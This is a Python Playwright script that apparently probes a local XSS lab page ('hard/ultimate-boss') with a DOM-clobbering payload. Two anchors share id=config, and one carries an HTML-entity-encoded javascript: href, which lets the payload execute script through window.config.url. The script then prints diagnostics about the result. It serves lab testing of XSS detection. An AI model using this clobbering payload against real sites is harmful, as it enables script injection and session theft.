"""Inspect the local hard-lab DOM-clobbering gadget in Chromium."""
import json
import sys
from pathlib import Path
from urllib.parse import quote

from playwright.sync_api import sync_playwright
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from browser_workers.oracle_inject import get_oracle_script


TOKEN = "DIAGNOSTIC_TOKEN"
encoded_js = "".join(
    f"&#{ord(char)};" for char in f'javascript:parent.__XSS__("{TOKEN}")'
)
payload = f"<a id=config><a id=config name=url href={encoded_js}>"
url = "http://127.0.0.1:8099/hard/ultimate-boss?q=" + quote(payload, safe="")

with sync_playwright() as playwright:
    browser = playwright.chromium.launch(headless=True)
    page = browser.new_page()
    context = browser.new_context()
    context.add_init_script(
        f"window.__XSS_TOKEN__={json.dumps(TOKEN)};"
        "window.__ORACLE_URL__='http://127.0.0.1:1/oracle';"
        + get_oracle_script()
    )
    page = context.new_page()
    console_messages = []
    page_errors = []
    page.on("console", lambda message: console_messages.append(message.text))
    page.on("pageerror", lambda error: page_errors.append(str(error)))
    page.goto(url, wait_until="load")
    page.wait_for_timeout(500)
    print(json.dumps(page.evaluate("""() => ({
        configType: typeof window.config,
        configConstructor: window.config && window.config.constructor && window.config.constructor.name,
        configValue: String(window.config),
        configUrl: window.config && String(window.config.url),
        anchors: Array.from(document.querySelectorAll('a#config')).map(node => node.outerHTML),
        frames: Array.from(document.querySelectorAll('iframe')).map(node => node.src),
        callbackType: typeof window.__XSS__,
    })"""), indent=2))
    print(json.dumps({"console": console_messages, "page_errors": page_errors}, indent=2))
    browser.close()
